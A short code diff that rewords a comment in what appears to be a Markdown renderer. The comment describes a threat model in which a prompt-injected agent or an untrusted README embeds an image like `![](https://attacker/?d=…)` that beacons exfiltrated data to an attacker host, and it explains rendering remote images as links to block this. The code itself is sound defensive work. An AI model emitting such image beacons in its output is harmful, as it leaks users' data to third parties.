@@ -70,7 +70,7 @@ export const REMOTE_URL_RE = /^(?!data:)[a-z][a-z0-9+.-]*:|^\/\//i;
 
 // Images are the one Markdown construct that reaches the network with no click.
 // Both sides of this app render text we don't trust — a prompt-injected agent
-// writes discussions and comments, and a reviewed repo's README is someone else's
+// writes threads and comments, and a reviewed repo's README is someone else's
 // file — so `![](https://attacker/?d=…)` would beacon (and could carry
 // exfiltrated content in the query) the moment the human opens the review.
 // Render a remote image as the link it is and let the human decide to load it.
